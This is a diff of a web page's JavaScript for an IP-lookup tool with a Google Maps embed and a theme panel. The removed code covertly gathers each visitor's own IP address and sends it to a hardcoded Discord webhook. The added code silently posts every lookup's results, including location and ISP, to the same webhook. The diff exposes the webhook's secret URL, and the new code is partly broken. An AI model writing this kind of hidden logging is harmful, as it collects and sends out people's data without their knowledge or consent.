@@ -275,73 +275,70 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                console.error("Error fetching user IP:", error);
-                return 'N/A';
+                console.error('Error fetching IP:', error);
             }
         }
 
-        async function sendLogToDiscord(message, userIP) {
-            const webhookURL = 'https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o';
-            const logMessage = {
-                username: "IP Lookup Bot",
-                avatar_url: "https://example.com/your-avatar.png", 
-                embeds: [{
-                    title: "New Log Entry",
-                    color: 5814783,
-                    fields: [
-                        { name: "Timestamp", value: new Date().toLocaleString() },
-                        { name: "Log Message", value: message },
-                        { name: "User IP", value: userIP },
-                    ],
-                }]
+        async function lookupIP() {
+            const ip = document.getElementById('ip').value;
+
+            // Fetch IP lookup data
+            const response = await fetch(`https://ipinfo.io/${ip}/json?token=<4b708a498f9053>`);
+            const data = await response.json();
+
+            // Update UI with fetched data
+            document.getElementById('ipAddress').innerText = data.ip;
+            document.getElementById('city').innerText = data.city;
+            document.getElementById('region').innerText = data.region;
+            document.getElementById('country').innerText = data.country;
+            document.getElementById('isp').innerText = data.org;
+            document.getElementById('latitude').innerText = data.loc.split(',')[0];
+            document.getElementById('longitude').innerText = data.loc.split(',')[1];
+            document.getElementById('timezone').innerText = data.timezone;
+
+            // Update map
+            document.getElementById('googleMap').innerHTML = `<div class="gmap_canvas"><iframe class="gmap_iframe" src="https://maps.google.com/maps?q=${data.loc}&output=embed" frameborder="0" scrolling="no"></iframe></div>`;
+
+            // Show result
+            document.getElementById('result').classList.remove('hidden');
+
+            // Log to Discord
+            logToDiscord(data);
+        }
+
+        function logToDiscord(data) {
+            const webhookURL = "<https://discord.com/api/webhooks/1346896671123968082/yR-RgtuhYK3oJON5WW_dpspCRSY47EAEASWw7c8NorE46f6MB2jpS9UnFZ2qGILiJb7o>";
+            const discordMessage = {
+                username: "IP Lookup Log",
+                content: `**IP Lookup Result**\n\n**IP Address:** ${data.ip}\n**City:** ${data.city}\n**Region:** ${data.region}\n**Country:** ${data.country}\n**ISP:** ${data.org}\n**Location:** ${data.loc}\n**Timezone:** ${data.timezone}`
             };
 
-            await fetch(webhookURL, {
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(logMessage),
-            });
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Log sent to Discord:', data))
+            .catch(error => console.error('Error sending log to Discord:', error));
         }
 
-        async function lookupIP() {
-            const ip = document.getElementById("ip").value;
-            const resultDiv = document.getElementById("result");
-            const googleMapDiv = document.getElementById("googleMap");
+        function applyCustomTheme() {
+            const backgroundColor = document.getElementById('backgroundColor').value;
+            const buttonColor = document.getElementById('buttonColor').value;
 
-            try {
-                const response = await fetch(`https://ipinfo.io/${ip}/json`);
-                const data = await response.json();
-
-                // Haal het IP van de gebruiker op
-                const userIP = await getUserIP();
-
-                if (data.error) {
-                    resultDiv.classList.add("hidden");
-                    googleMapDiv.innerHTML = "Error fetching data";
-                } else {
-                    resultDiv.classList.remove("hidden");
-
-                    document.getElementById("ipAddress").textContent = data.ip;
-                    document.getElementById("city").textContent = data.city || 'N/A';
-                    document.getElementById("region").textContent = data.region || 'N/A';
-                    document.getElementById("country").textContent = data.country || 'N/A';
-                    document.getElementById("isp").textContent = data.org || 'N/A';
-                    document.getElementById("latitude").textContent = 'N/A';
-                    document.getElementById("longitude").textContent = 'N/A';
-                    document.getElementById("timezone").textContent = data.timezone || 'N/A';
-
-                    const mapSrc = `https://www.google.com/maps/embed/v1/view?key=YOUR_GOOGLE_MAP_API_KEY&center=${data.loc.split(',')[0]},${data.loc.split(',')[1]}&zoom=14`;
-                    googleMapDiv.innerHTML = `<iframe class="gmap_iframe" src="${mapSrc}" frameborder="0" style="border:0" allowfullscreen></iframe>`;
-
-                    // Log de lookup naar Discord, inclusief het IP van de gebruiker
-                    await sendLogToDiscord(`IP Lookup for ${ip} successful.`, userIP);
-                }
-            } catch (error) {
-                alert("Error fetching data.");
-            }
+            // Update background color and button color
+            document.body.style.backgroundColor = backgroundColor;
+            document.querySelector('#lookupButton').style.backgroundColor = buttonColor;
         }
+
+        // Toggle Settings Panel
+        document.getElementById("settingsIcon").onclick = () => {
+            const panel = document.getElementById('settingsPanel');
+            panel.classList.toggle('open');
+        };
     </script>
 </body>
 </html>
